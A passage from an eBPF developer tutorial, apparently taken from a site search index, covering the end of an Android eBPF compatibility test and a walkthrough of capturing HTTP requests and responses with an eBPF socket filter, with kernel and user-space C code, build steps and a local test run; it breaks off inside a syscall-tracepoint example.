0xb4a8bb0136cac8dd0f02000ae7e7e8b7 18446631020132448128 195421584 175014 3305 1 4 2 46248 443 NetworkService\n07:47:00  0x40040002b4a8bb0136cac8dd0f02000a 0xb4a8bb0136cac8dd0f02000ae7e7e8b7 18446631020132448128 195422361 777 3305 4 5 2 46248 443 NetworkService\n07:47:00  0x400500020000bb0136cac8dd0f02000a 0xbb0136cac8dd0f02000ae7e7e8b7 18446631020132448128 195422450 88 3305 5 7 2 46248 443 NetworkService\n07:47:01  0x400700020000bb01000000000f02000a 0xbb01000000000f02000aea2afb8e 18446631020099528128 196321556 0 1315 7 2 2 0 443 ChromiumNet\n</code></pre> <p>Note: some error messages may appear in the Android shell during the test:</p> <pre><code>libbpf: failed to determine tracepoint 'syscalls/sys_enter_open' perf event ID: No such file or directory\nlibbpf: prog 'tracepoint__syscalls__sys_enter_open': failed to create tracepoint 'syscalls/sys_enter_open' perf event: No such file or directory\nlibbpf: prog 'tracepoint__syscalls__sys_enter_open': failed to auto-attach: -2\nfailed to attach skeleton\nError: BpfError(\"load and attach ebpf program failed\")\n</code></pre> <p>Later, after investigation, it was found that the kernel did not enable the <code>CONFIG_FTRACE_SYSCALLS</code> option, which resulted in the inability to use the tracepoint of syscalls.</p>"},{"location":"tutorials/22-android/#summary","title":"Summary","text":"<p>The <code>CONFIG_DEBUG_INFO_BTF</code> option is enabled by default when viewing the kernel compilation options in the Android shell. Based on this, the examples provided by the eunomia-bpf project already have some successful cases, such as monitoring the execution of the <code>exec</code> family of functions and the status of TCP connections.</p> <p>For some cases that cannot run, the reasons are mainly the following:</p> <ol> <li>The kernel compilation options do not support the relevant eBPF functionality;</li> <li>The Linux environment packaged by eadb is weak and lacks necessary dependencies;</li> </ol> <p>Currently, using eBPF tools in the Android system still requires building a complete Linux runtime environment. However, the Android kernel itself has comprehensive support for eBPF. This test proves that higher versions of the Android kernel support BTF debugging information and CO-RE dependent eBPF programs.</p> <p>The development of eBPF tools in the Android system requires the addition of official new features. Currently, it seems that using eBPF tools directly through an Android app requires a lot of effort. At the same time, since eBPF tools require root privileges, ordinary Android users will encounter more difficulties in using them.</p> <p>If you want to learn more about eBPF knowledge and practice, you can visit our tutorial code repository https://github.com/eunomia-bpf/bpf-developer-tutorial or website https://eunomia.dev/tutorials/ to get more examples and complete tutorials.</p>"},{"location":"tutorials/22-android/#reference","title":"Reference","text":"<ul> <li>Google android docs</li> <li>weixin WeiShu</li> <li>SeeFlowerX</li> </ul> <p>The original link of this article: https://eunomia.dev/tutorials/22-android</p> <p>Share on  Share on </p>"},{"location":"tutorials/23-http/","title":"L7 Tracing with eBPF: HTTP and Beyond via Socket Filters and Syscall Tracepoints","text":"<p>In today's technology landscape, with the rise of microservices, cloud-native applications, and complex distributed systems, observability of systems has become a crucial factor in ensuring their health, performance, and security. Especially in a microservices architecture, application components may be distributed across multiple containers and servers, making traditional monitoring methods often insufficient to provide the depth and breadth needed to fully understand the behavior of the system. This is where observing seven-layer protocols such as HTTP, gRPC, MQTT, and more becomes particularly important.</p> <p>Seven-layer protocols provide detailed insights into how applications interact with other services and components. In a microservices environment, understanding these interactions is vital, as they often serve as the root causes of performance bottlenecks, failures, and security issues. However, monitoring these protocols is not a straightforward task. Traditional network monitoring tools like tcpdump, while effective at capturing network traffic, often fall short when dealing with the complexity and dynamism of seven-layer protocols.</p> <p>This is where eBPF (extended Berkeley Packet Filter) technology comes into play. eBPF allows developers and operators to delve deep into the kernel layer, observing and analyzing system behavior in real-time without the need to modify or insert instrumentation into application code. This presents a unique opportunity to handle application layer traffic more simply and efficiently, particularly in microservices environments.</p> <p>In this tutorial, we will delve into the following:</p> <ul> <li>Tracking seven-layer protocols such as HTTP and the challenges associated with them.</li> <li>eBPF's socket filter and syscall tracing: How these two technologies assist in tracing HTTP network request data at different kernel layers, and the advantages and limitations of each.</li> <li>eBPF practical tutorial: How to develop an eBPF program and utilize eBPF socket filter or syscall tracing to capture and analyze HTTP traffic.</li> </ul> <p>As network traffic increases and applications grow in complexity, gaining a deeper understanding of seven-layer protocols becomes increasingly important. Through this tutorial, you will acquire the necessary knowledge and tools to more effectively monitor and analyze your network traffic, ultimately enhancing the performance of your applications and servers.</p> <p>This article is part of the eBPF Developer Tutorial, and for more detailed content, you can visit here. The source code is available on the GitHub repository.</p>"},{"location":"tutorials/23-http/#challenges-in-tracking-http-http2-and-other-seven-layer-protocols","title":"Challenges in Tracking HTTP, HTTP/2, and Other Seven-Layer Protocols","text":"<p>In the modern networking environment, seven-layer protocols extend beyond just HTTP. In fact, there are many seven-layer protocols such as HTTP/2, gRPC, MQTT, WebSocket, AMQP, and SMTP, each serving critical roles in various application scenarios. These protocols provide detailed insights into how applications interact with other services and components. However, tracking these protocols is not a simple task, especially within complex distributed systems.</p> <ol> <li> <p>Diversity and Complexity: Each seven-layer protocol has its specific design and workings. For example, gRPC utilizes HTTP/2 as its transport protocol and supports multiple languages, while MQTT is a lightweight publish/subscribe messaging transport protocol designed for low-bandwidth and unreliable networks.</p> </li> <li> <p>Dynamism: Many seven-layer protocols are dynamic, meaning their behavior can change based on network conditions, application requirements, or other factors.</p> </li> <li> <p>Encryption and Security: With increased security awareness, many seven-layer protocols employ encryption technologies such as TLS/SSL. This introduces additional challenges for tracking and analysis, as decrypting traffic is required for in-depth examination.</p> </li> <li> <p>High-Performance Requirements: In high-traffic production environments, capturing and analyzing traffic for seven-layer protocols can impact system performance. Traditional network monitoring tools may struggle to handle a large number of concurrent sessions.</p> </li> <li> <p>Data Completeness and Continuity: Unlike tools like tcpdump, which capture individual packets, tracking seven-layer protocols requires capturing complete sessions, which may involve multiple packets. This necessitates tools capable of correctly reassembling and parsing these packets to provide a continuous session view.</p> </li> <li> <p>Code Intrusiveness: To gain deeper insights into the behavior of seven-layer protocols, developers may need to modify application code to add monitoring functionalities. This not only increases development and maintenance complexity but can also impact application performance.</p> </li> </ol> <p>As mentioned earlier, eBPF provides a powerful solution, allowing us to capture and analyze seven-layer protocol traffic in the kernel layer without modifying application code. This approach not only offers insights into system behavior but also ensures optimal performance and efficiency. This is why eBPF has become the preferred technology for modern observability tools, especially in production environments that demand high performance and low latency.</p>"},{"location":"tutorials/23-http/#ebpf-socket-filter-vs-syscall-tracing-in-depth-analysis-and-comparison","title":"eBPF Socket Filter vs. Syscall Tracing: In-Depth Analysis and Comparison","text":""},{"location":"tutorials/23-http/#ebpf-socket-filter","title":"eBPF Socket Filter","text":"<p>What Is It? eBPF socket filter is an extension of the classic Berkeley Packet Filter (BPF) that allows for more advanced packet filtering directly within the kernel. It operates at the socket layer, enabling fine-grained control over which packets are processed by user-space applications.</p> <p>Key Features:</p> <ul> <li>Performance: By handling packets directly within the kernel, eBPF socket filters reduce the overhead of context switches between user and kernel spaces.</li> <li>Flexibility: eBPF socket filters can be attached to any socket, providing a universal packet filtering mechanism for various protocols and socket types.</li> <li>Programmability: Developers can write custom eBPF programs to define complex filtering logic beyond simple packet matching.</li> </ul> <p>Use Cases:</p> <ul> <li>Traffic Control: Restrict or prioritize traffic based on custom conditions.</li> <li>Security: Discard malicious packets before they reach user-space applications.</li> <li>Monitoring: Capture specific packets for analysis without affecting other traffic.</li> </ul>"},{"location":"tutorials/23-http/#ebpf-syscall-tracing","title":"eBPF Syscall Tracing","text":"<p>What Is It? System call tracing using eBPF allows monitoring and manipulation of system calls made by applications. System calls are the primary mechanism through which user-space applications interact with the kernel, making tracing them a valuable way to understand application behavior.</p> <p>Key Features:</p> <ul> <li>Granularity: eBPF allows tracing specific system calls, even specific parameters within those system calls.</li> <li>Low Overhead: Compared to other tracing methods, eBPF syscall tracing is designed to have minimal performance impact.</li> <li>Security: Kernel validates eBPF programs to ensure they do not compromise system stability.</li> </ul> <p>How It Works: eBPF syscall tracing typically involves attaching eBPF programs to tracepoints or kprobes related to the system calls being traced. When the traced system call is invoked, the eBPF program is executed, allowing data collection or even modification of system call parameters.</p>"},{"location":"tutorials/23-http/#comparison-of-ebpf-socket-filter-and-syscall-tracing","title":"Comparison of eBPF Socket Filter and Syscall Tracing","text":"Aspect eBPF Socket Filter eBPF Syscall Tracing Operational Layer Socket layer, primarily dealing with network packets received from or sent to sockets. System call layer, monitoring and potentially altering the behavior of system calls made by applications. Primary Use Cases Mainly used for filtering, monitoring, and manipulation of network packets. Used for performance analysis, security monitoring, and debugging of interactions with the network. Granularity Focuses on individual network packets. Can monitor a wide range of system activities, including those unrelated to networking. Tracking HTTP Traffic Can be used to filter and capture HTTP packets passed through sockets. Can trace system calls associated with networking operations, which may include HTTP traffic. <p>In summary, both eBPF socket filters and syscall tracing can be used to trace HTTP traffic, but socket filters are more direct and suitable for this purpose. However, if you are interested in the broader context of how an application interacts with the system (e.g., which system calls lead to HTTP traffic), syscall tracing can be highly valuable. In many advanced observability setups, both tools may be used simultaneously to provide a comprehensive view of system and network behavior.</p>"},{"location":"tutorials/23-http/#capturing-http-traffic-with-ebpf-socket-filter","title":"Capturing HTTP Traffic with eBPF Socket Filter","text":"<p>eBPF code consists of user-space and kernel-space components, and here we primarily focus on the kernel-space code. Below is the main logic for capturing HTTP traffic in the kernel using eBPF socket filter technology, and the complete code is provided:</p> <pre><code>SEC(\"socket\")\nint socket_handler(struct __sk_buff *skb)\n{\n    struct so_event *e;\n    __u8 verlen;\n    __u16 proto;\n    __u32 nhoff = ETH_HLEN;\n    __u32 ip_proto = 0;\n    __u32 tcp_hdr_len = 0;\n    __u16 tlen;\n    __u32 payload_offset = 0;\n    __u32 payload_length = 0;\n    __u8 hdr_len;\n\n    bpf_skb_load_bytes(skb, 12, &amp;proto, 2);\n    proto = __bpf_ntohs(proto);\n    if (proto != ETH_P_IP)\n        return 0;\n\n    if (ip_is_fragment(skb, nhoff))\n        return 0;\n\n    // ip4 header lengths are variable\n    // access ihl as a u8 (linux/include/linux/skbuff.h)\n    bpf_skb_load_bytes(skb, ETH_HLEN, &amp;hdr_len, sizeof(hdr_len));\n    hdr_len &amp;= 0x0f;\n    hdr_len *= 4;\n\n    /* verify hlen meets minimum size requirements */\n    if (hdr_len &lt; sizeof(struct iphdr))\n    {\n        return 0;\n    }\n\n    bpf_skb_load_bytes(skb, nhoff + offsetof(struct iphdr, protocol), &amp;ip_proto, 1);\n\n    if (ip_proto != IPPROTO_TCP)\n    {\n        return 0;\n    }\n\n    tcp_hdr_len = nhoff + hdr_len;\n    bpf_skb_load_bytes(skb, nhoff + 0, &amp;verlen, 1);\n    bpf_skb_load_bytes(skb, nhoff + offsetof(struct iphdr, tot_len), &amp;tlen, sizeof(tlen));\n\n    __u8 doff;\n    bpf_skb_load_bytes(skb, tcp_hdr_len + offsetof(struct __tcphdr, ack_seq) + 4, &amp;doff, sizeof(doff)); // read the first byte past __tcphdr-&gt;ack_seq, we can't do offsetof bit fields\n    doff &amp;= 0xf0; // clean-up res1\n    doff &gt;&gt;= 4; // move the upper 4 bits to low\n    doff *= 4; // convert to bytes length\n\n    payload_offset = ETH_HLEN + hdr_len + doff;\n    payload_length = __bpf_ntohs(tlen) - hdr_len - doff;\n\n    char line_buffer[7];\n    if (payload_length &lt; 7 || payload_offset &lt; 0)\n    {\n        return 0;\n    }\n    bpf_skb_load_bytes(skb, payload_offset, line_buffer, 7);\n    bpf_printk(\"%d len %d buffer: %s\", payload_offset, payload_length, line_buffer);\n    if (bpf_strncmp(line_buffer, 3, \"GET\") != 0 &amp;&amp;\n        bpf_strncmp(line_buffer, 4, \"POST\") != 0 &amp;&amp;\n        bpf_strncmp(line_buffer, 3, \"PUT\") != 0 &amp;&amp;\n        bpf_strncmp(line_buffer, 6, \"DELETE\") != 0 &amp;&amp;\n        bpf_strncmp(line_buffer, 4, \"HTTP\") != 0)\n    {\n        return 0;\n    }\n\n    /* reserve sample from BPF ringbuf */\n    e = bpf_ringbuf_reserve(&amp;rb, sizeof(*e), 0);\n    if (!e)\n        return 0;\n\n    e-&gt;ip_proto = ip_proto;\n    bpf_skb_load_bytes(skb, nhoff + hdr_len, &amp;(e-&gt;ports), 4);\n    e-&gt;pkt_type = skb-&gt;pkt_type;\n    e-&gt;ifindex = skb-&gt;ifindex;\n\n    e-&gt;payload_length = payload_length;\n    bpf_skb_load_bytes(skb, payload_offset, e-&gt;payload, MAX_BUF_SIZE);\n\n    bpf_skb_load_bytes(skb, nhoff + offsetof(struct iphdr, saddr), &amp;(e-&gt;src_addr), 4);\n    bpf_skb_load_bytes(skb, nhoff + offsetof(struct iphdr, daddr), &amp;(e-&gt;dst_addr), 4);\n    bpf_ringbuf_submit(e, 0);\n\n    return skb-&gt;len;\n}\n</code></pre> <p>When analyzing this eBPF program, we will explain it in detail according to the content of each code block and provide relevant background knowledge:</p> <pre><code>SEC(\"socket\")\nint socket_handler(struct __sk_buff *skb)\n{\n    // ...\n}\n</code></pre> <p>This is the entry point of the eBPF program, defining a function named <code>socket_handler</code> that the kernel uses to handle incoming network packets. This function is located in an eBPF section named <code>socket</code>, indicating that it is intended for socket handling.</p> <pre><code>struct so_event *e;\n__u8 verlen;\n__u16 proto;\n__u32 nhoff = ETH_HLEN;\n__u32 ip_proto = 0;\n__u32 tcp_hdr_len = 0;\n__u16 tlen;\n__u32 payload_offset = 0;\n__u32 payload_length = 0;\n__u8 hdr_len;\n</code></pre> <p>In this code block, several variables are defined to store information needed during packet processing. These variables include <code>struct so_event *e</code> for storing event information, <code>verlen</code>, <code>proto</code>, <code>nhoff</code>, <code>ip_proto</code>, <code>tcp_hdr_len</code>, <code>tlen</code>, <code>payload_offset</code>, <code>payload_length</code>, and <code>hdr_len</code> for storing packet information.</p> <ul> <li><code>struct so_event *e;</code>: This is a pointer to the <code>so_event</code> structure for storing captured event information. The specific definition of this structure is located elsewhere in the program.</li> <li><code>__u8 verlen;</code>, <code>__u16 proto;</code>, <code>__u32 nhoff = ETH_HLEN;</code>: These variables are used to store various pieces of information, such as protocol types, packet offsets, etc. <code>nhoff</code> is initialized to the length of the Ethernet frame header, typically 14 bytes, as Ethernet frame headers include destination MAC address, source MAC address, and frame type fields.</li> <li><code>__u32 ip_proto = 0;</code>: This variable is used to store the type of the IP protocol and is initialized to 0.</li> <li><code>__u32 tcp_hdr_len = 0;</code>: This variable is used to store the length of the TCP header and is initialized to 0.</li> <li><code>__u16 tlen;</code>: This variable is used to store the total length of the IP packet.</li> <li><code>__u32 payload_offset = 0;</code>, <code>__u32 payload_length = 0;</code>: These two variables are used to store the offset and length of the HTTP request payload.</li> <li><code>__u8 hdr_len;</code>: This variable is used to store the length of the IP header.</li> </ul> <pre><code>bpf_skb_load_bytes(skb, 12, &amp;proto, 2);\nproto = __bpf_ntohs(proto);\nif (proto != ETH_P_IP)\n    return 0;\n</code></pre> <p>Here, the code loads the Ethernet frame type field from the packet, which tells us the network layer protocol being used in the packet. It then uses the <code>__bpf_ntohs</code> function to convert the network byte order type field into host byte order. Next, the code checks if the type field is not equal to the Ethernet frame type for IPv4 (0x0800). If it's not equal, it means the packet is not an IPv4 packet, and the function returns 0, indicating that the packet should not be processed.</p> <p>Key concepts to understand here:</p> <ul> <li>Ethernet Frame: The Ethernet frame is a data link layer (Layer 2) protocol used for transmitting data frames within a local area network (LAN). Ethernet frames typically include destination MAC address, source MAC address, and frame type fields.</li> <li>Network Byte Order: Network protocols often use big-endian byte order to represent data. Therefore, data received from the network needs to be converted into host byte order for proper interpretation on the host. Here, the type field from the network is converted to host byte order for further processing.</li> <li>IPv4 Frame Type (ETH_P_IP): This represents the frame type field in the Ethernet frame, where 0x0800 indicates IPv4.</li> </ul> <pre><code>if (ip_is_fragment(skb, nhoff))\n    return 0;\n</code></pre> <p>This part of the code checks if IP fragmentation is being handled. IP fragmentation is a mechanism for splitting larger IP packets into multiple smaller fragments for transmission. Here, if the packet is an IP fragment, the function returns 0, indicating that only complete packets will be processed.</p> <pre><code>static inline int ip_is_fragment(struct __sk_buff *skb, __u32 nhoff)\n{\n    __u16 frag_off;\n\n    bpf_skb_load_bytes(skb, nhoff + offsetof(struct iphdr, frag_off), &amp;frag_off, 2);\n    frag_off = __bpf_ntohs(frag_off);\n    return frag_off &amp; (IP_MF | IP_OFFSET);\n}\n</code></pre> <p>The above code is a helper function used to check if the incoming IPv4 packet is an IP fragment. IP fragmentation is a mechanism where, if the size of an IP packet exceeds the Maximum Transmission Unit (MTU) of the network, routers split it into smaller fragments for transmission across the network. The purpose of this function is to examine the fragment flags and fragment offset fields within the packet to determine if it is a fragment.</p> <p>Here's an explanation of the code line by line:</p> <ol> <li><code>__u16 frag_off;</code>: Defines a 16-bit unsigned integer variable <code>frag_off</code> to store the fragment offset field.</li> <li><code>bpf_skb_load_bytes(skb, nhoff + offsetof(struct iphdr, frag_off), &amp;frag_off, 2);</code>: This line of code uses the <code>bpf_skb_load_bytes</code> function to load the fragment offset field from the packet. <code>nhoff</code> is the offset of the IP header within the packet, and <code>offsetof(struct iphdr, frag_off)</code> calculates the offset of the fragment offset field within the IPv4 header.</li> <li><code>frag_off = __bpf_ntohs(frag_off);</code>: Converts the loaded fragment offset field from network byte order (big-endian) to host byte order. Network protocols typically use big-endian to represent data, and the conversion to host byte order is done for further processing.</li> <li><code>return frag_off &amp; (IP_MF | IP_OFFSET);</code>: This line of code checks the value of the fragment offset field using a bitwise AND operation with two flag values:</li> <li><code>IP_MF</code>: Represents the \"More Fragments\" flag. If this flag is set to 1, it indicates that the packet is part of a fragmented sequence and more fragments are expected.</li> <li><code>IP_OFFSET</code>: Represents the fragment offset field. If the fragment offset field is non-zero, it indicates that the packet is part of a fragmented sequence and has a fragment offset value.    If either of these flags is set to 1, the result is non-zero, indicating that the packet is an IP fragment. If both flags are 0, it means the packet is not fragmented.</li> </ol> <p>It's important to note that the fragment offset field in the IP header is specified in units of 8 bytes, so the actual byte offset is obtained by left-shifting the value by 3 bits. Additionally, the \"More Fragments\" flag (IP_MF) in the IP header indicates whether there are more fragments in the sequence and is typically used in conjunction with the fragment offset field to indicate the status of fragmented packets.</p> <pre><code>bpf_skb_load_bytes(skb, ETH_HLEN, &amp;\n\nhdr_len, sizeof(hdr_len));\nhdr_len &amp;= 0x0f;\nhdr_len *= 4;\n</code></pre> <p>In this part of the code, the length of the IP header is loaded from the packet. The IP header length field contains information about the length of the IP header in units of 4 bytes, and it needs to be converted to bytes. Here, it is converted by performing a bitwise AND operation with 0x0f and then multiplying it by 4.</p> <p>Key concept:</p> <ul> <li>IP Header: The IP header contains fundamental information about a packet, such as the source IP address, destination IP address, protocol type, total length, identification, flags, fragment offset, time to live (TTL), checksum, source port, and destination port.</li> </ul> <pre><code>if (hdr_len &lt; sizeof(struct iphdr))\n{\n    return 0;\n}\n</code></pre> <p>This code segment checks if the length of the IP header meets the minimum length requirement, typically 20 bytes. If the length of the IP header is less than 20 bytes, it indicates an incomplete or corrupted packet, and the function returns 0, indicating that the packet should not be processed.</p> <p>Key concept:</p> <ul> <li><code>struct iphdr</code>: This is a structure defined in the Linux kernel, representing the format of an IPv4 header. It includes fields such as version, header length, service type, total length, identification, flags, fragment offset, time to live, protocol, header checksum, source IP address, and destination IP address, among others.</li> </ul> <pre><code>bpf_skb_load_bytes(skb, nhoff + offsetof(struct iphdr, protocol), &amp;ip_proto, 1);\nif (ip_proto != IPPROTO_TCP)\n{\n    return 0;\n}\n</code></pre> <p>Here, the code loads the protocol field from the IP header to determine the transport layer protocol used in the packet. Then, it checks if the protocol field is not equal to the value for TCP (IPPROTO_TCP). If it's not TCP, it means the packet is not an HTTP request or response, and the function returns 0.</p> <p>Key concept:</p> <ul> <li>Transport Layer Protocol: The protocol field in the IP header indicates the transport layer protocol used in the packet, such as TCP, UDP, or ICMP.</li> </ul> <pre><code>tcp_hdr_len = nhoff + hdr_len;\n</code></pre> <p>This line of code calculates the offset of the TCP header. It adds the length of the Ethernet frame header (<code>nhoff</code>) to the length of the IP header (<code>hdr_len</code>) to obtain the starting position of the TCP header.</p> <pre><code>bpf_skb_load_bytes(skb, nhoff + 0, &amp;verlen, 1);\n</code></pre> <p>This line of code loads the first byte of the TCP header from the packet, which contains information about the TCP header length. This length field is specified in units of 4 bytes and requires further conversion.</p> <pre><code>bpf_skb_load_bytes(skb, nhoff + offsetof(struct iphdr, tot_len), &amp;tlen, sizeof(tlen));\n</code></pre> <p>This line of code loads the total length field of the IP header from the packet. The IP header's total length field represents the overall length of the IP packet, including both the IP header and the data portion.</p> <pre><code>__u8 doff;\nbpf_skb_load_bytes(skb, tcp_hdr_len + offsetof(struct __tcphdr, ack_seq) + 4, &amp;doff, sizeof(doff));\ndoff &amp;= 0xf0;\ndoff &gt;&gt;= 4;\ndoff *= 4;\n</code></pre> <p>This piece of code is used to calculate the length of the TCP header. It loads the Data Offset field (also known as the Header Length field) from the TCP header, which represents the length of the TCP header in units of 4 bytes. The code clears the high four bits of the offset field, then shifts it right by 4 bits, and finally multiplies it by 4 to obtain the actual length of the TCP header.</p> <p>Key points to understand:</p> <ul> <li>TCP Header: The TCP header contains information related to the TCP protocol, such as source port, destination port, sequence number, acknowledgment number, flags (e.g., SYN, ACK, FIN), window size, and checksum.</li> </ul> <pre><code>payload_offset = ETH_HLEN + hdr_len + doff;\npayload_length = __bpf_ntohs(tlen) - hdr_len - doff;\n</code></pre> <p>These two lines of code calculate the offset and length of the HTTP request payload. They add the lengths of the Ethernet frame header, IP header, and TCP header together to obtain the offset to the data portion of the HTTP request. Then, by subtracting the total length, IP header length, and TCP header length from the total length field, they calculate the length of the HTTP request data.</p> <p>Key point:</p> <ul> <li>HTTP Request Payload: The actual data portion included in an HTTP request, typically consisting of the HTTP request headers and request body.</li> </ul> <pre><code>char line_buffer[7];\nif (payload_length &lt; 7 || payload_offset &lt; 0)\n{\n    return 0;\n}\nbpf_skb_load_bytes(skb, payload_offset, line_buffer, 7);\nbpf_printk(\"%d len %d buffer: %s\", payload_offset, payload_length, line_buffer);\n</code></pre> <p>This portion of the code loads the first 7 bytes of the HTTP request line and stores them in a character array named <code>line_buffer</code>. It then checks if the length of the HTTP request data is less than 7 bytes or if the offset is negative. If these conditions are met, it indicates an incomplete HTTP request, and the function returns 0. Finally, it uses the <code>bpf_printk</code> function to print the content of the HTTP request line to the kernel log for debugging and analysis.</p> <pre><code>if (bpf_strncmp(line_buffer, 3, \"GET\") != 0 &amp;&amp;\n    bpf_strncmp(line_buffer, 4, \"POST\") != 0 &amp;&amp;\n    bpf_strncmp(line_buffer, 3, \"PUT\") != 0 &amp;&amp;\n    bpf_strncmp(line_buffer, 6, \"DELETE\") != 0 &amp;&amp;\n    bpf_strncmp(line_buffer, 4, \"HTTP\") != 0)\n{\n    return 0;\n}\n</code></pre> <p>Note: The <code>bpf_strncmp</code> function is a helper function available from kernel version 5.17. For earlier versions, you can manually write a function to compare strings.</p> <p>This piece of code uses the <code>bpf_strncmp</code> function to compare the data in <code>line_buffer</code> with HTTP request methods (GET, POST, PUT, DELETE, HTTP). If there is no match, indicating that it is not an HTTP request, it returns 0, indicating that it should not be processed.</p> <pre><code>e = bpf_ringbuf_reserve(&amp;rb, sizeof(*e), 0);\nif (!e)\n    return 0;\n</code></pre> <p>This section of the code attempts to reserve a block of memory from the BPF ring buffer to store event information. If it cannot reserve the memory block, it returns 0. The BPF ring buffer is used to pass event data between the eBPF program and user space.</p> <p>Key point:</p> <ul> <li>BPF Ring Buffer: The BPF ring buffer is a mechanism for passing data between eBPF programs and user space. It can be used to store event information for further processing or analysis by user space applications.</li> </ul> <pre><code>e-&gt;ip_proto = ip_proto;\nbpf_skb_load_bytes(skb, nhoff + hdr_len, &amp;(e-&gt;ports), 4);\ne-&gt;pkt_type = skb-&gt;pkt_type;\ne-&gt;ifindex = skb-&gt;ifindex;\n\ne-&gt;payload_length = payload_length;\nbpf_skb_load_bytes(skb, payload_offset, e-&gt;payload, MAX_BUF_SIZE);\n\nbpf_skb_load_bytes(skb, nhoff + offsetof(struct iphdr, saddr), &amp;(e-&gt;src_addr), 4);\nbpf_skb_load_bytes(skb, nhoff + offsetof(struct iphdr, daddr), &amp;(e-&gt;dst_addr), 4);\nbpf_ringbuf_submit(e, 0);\n\nreturn skb-&gt;len;\n</code></pre> <p>Finally, this code segment stores the captured event information in the <code>e</code> structure and submits it to the BPF ring buffer. It includes information such as the captured IP protocol, source and destination ports, packet type, interface index, payload length, source IP address, and destination IP address. Finally, it returns the length of the packet, indicating that the packet was successfully processed.</p> <p>This code is primarily used to store captured event information for further processing. The BPF ring buffer is used to pass this information to user space for additional handling or logging.</p> <p>In summary, this eBPF program's main task is to capture HTTP requests. It accomplishes this by parsing the Ethernet frame, IP header, and TCP header of incoming packets to determine if they contain HTTP requests. Information about the requests is then stored in the <code>so_event</code> structure and submitted to the BPF ring buffer. This is an efficient method for capturing HTTP traffic at the kernel level and is suitable for applications such as network monitoring and security analysis.</p>"},{"location":"tutorials/23-http/#potential-limitations","title":"Potential Limitations","text":"<p>The above code has some potential limitations, and one of the main limitations is that it cannot handle URLs that span multiple packets.</p> <ul> <li>Cross-Packet URLs: The code checks the URL in an HTTP request by parsing a single data packet. If the URL of an HTTP request spans multiple packets, it will only examine the URL in the first packet. This can lead to missing or partially capturing long URLs that span multiple data packets.</li> </ul> <p>To address this issue, a solution often involves reassembling multiple packets to reconstruct the complete HTTP request. This may require implementing packet caching and assembly logic within the eBPF program and waiting to collect all relevant packets until the HTTP request is detected. This adds complexity and may require additional memory to handle cases where URLs span multiple packets.</p>"},{"location":"tutorials/23-http/#user-space-code","title":"User-Space Code","text":"<p>The user-space code's main purpose is to create a raw socket and then attach the previously defined eBPF program in the kernel to that socket, allowing the eBPF program to capture and process network packets received on that socket. Here's an example of the user-space code:</p> <pre><code>/* Create raw socket for localhost interface */\nsock = open_raw_sock(interface);\nif (sock &lt; 0) {\n    err = -2;\n    fprintf(stderr, \"Failed to open raw socket\\n\");\n    goto cleanup;\n}\n\n/* Attach BPF program to raw socket */\nprog_fd = bpf_program__fd(skel-&gt;progs.socket_handler);\nif (setsockopt(sock, SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, sizeof(prog_fd))) {\n    err = -3;\n    fprintf(stderr, \"Failed to attach to raw socket\\n\");\n    goto cleanup;\n}\n</code></pre> <ol> <li><code>sock = open_raw_sock(interface);</code>: This line of code calls a custom function <code>open_raw_sock</code>, which is used to create a raw socket. Raw sockets allow a user-space application to handle network packets directly without going through the protocol stack. The <code>interface</code> parameter might specify the network interface from which to receive packets, determining where to capture packets from. If creating the socket fails, it returns a negative value, otherwise, it returns the file descriptor of the socket <code>sock</code>.</li> <li>If the value of <code>sock</code> is less than 0, indicating a failure to open the raw socket, it sets <code>err</code> to -2 and prints an error message on the standard error stream.</li> <li><code>prog_fd = bpf_program__fd(skel-&gt;progs.socket_handler);</code>: This line of code retrieves the file descriptor of the socket filter program (<code>socket_handler</code>) previously defined in the eBPF program. It is necessary to attach this program to the socket. <code>skel</code> is a pointer to an eBPF program object, and it provides access to the program collection.</li> <li><code>setsockopt(sock, SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, sizeof(prog_fd))</code>: This line of code uses the <code>setsockopt</code> system call to attach the eBPF program to the raw socket. It sets the <code>SO_ATTACH_BPF</code> option and passes the file descriptor of the eBPF program to the option, letting the kernel know which eBPF program to apply to this socket. If the attachment is successful, the socket starts capturing and processing network packets received on it.</li> <li>If <code>setsockopt</code> fails, it sets <code>err</code> to -3 and prints an error message on the standard error stream.</li> </ol>"},{"location":"tutorials/23-http/#compilation-and-execution","title":"Compilation and Execution","text":"<p>The complete source code can be found at https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/23-http. To compile and run the code:</p> <pre><code>$ git submodule update --init --recursive\n$ make\n  BPF      .output/sockfilter.bpf.o\n  GEN-SKEL .output/sockfilter.skel.h\n  CC       .output/sockfilter.o\n  BINARY   sockfilter\n$ sudo ./sockfilter \n...\n</code></pre> <p>In another terminal, start a simple web server using Python:</p> <pre><code>python3 -m http.server\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n127.0.0.1 - - [18/Sep/2023 01:05:52] \"GET / HTTP/1.1\" 200 -\n</code></pre> <p>You can use <code>curl</code> to make requests:</p> <pre><code>$ curl http://0.0.0.0:8000/\n&lt;!DOCTYPE HTML&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n&lt;meta charset=\"utf-8\"&gt;\n&lt;title&gt;Directory listing for /&lt;/title&gt;\n....\n</code></pre> <p>In the eBPF program, you can see that it prints the content of HTTP requests:</p> <pre><code>127.0.0.1:34552(src) -&gt; 127.0.0.1:8000(dst)\npayload: GET / HTTP/1.1\nHost: 0.0.0.0:8000\nUser-Agent: curl/7.88.1\n...\n127.0.0.1:8000(src) -&gt; 127.0.0.1:34552(dst)\npayload: HTTP/1.0 200 OK\nServer: SimpleHTTP/0.6 Python/3.11.4\n...\n</code></pre> <p>It captures both request and response content.</p>"},{"location":"tutorials/23-http/#capturing-http-traffic-using-ebpf-syscall-tracepoints","title":"Capturing HTTP Traffic Using eBPF Syscall Tracepoints","text":"<p>eBPF provides a powerful mechanism for tracing system calls at the kernel level. In this example, we'll use eBPF to trace the <code>accept</code> and <code>read</code> system calls to capture HTTP traffic. Due to space limitations, we'll provide a brief overview of the code framework.</p> <pre><code>struct\n{\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, 4096);\n    __type(key, u64);\n    __type(value, struct accept_args_t);\n} active_accept_args_map SEC(\".maps\");\n\n// Define a tracepoint at the entry of the accept system call\nSEC(\"tracepoint/syscalls/sys_enter_accept\")\nint sys_enter_accept(struct trace_event_raw_sys_enter *ctx)\n{\n    u64 id = bpf_get_current_pid_tgid();\n    // ... Get and store the arguments of the accept call\n    bpf_map_update_elem(&amp;active_accept_args_map, 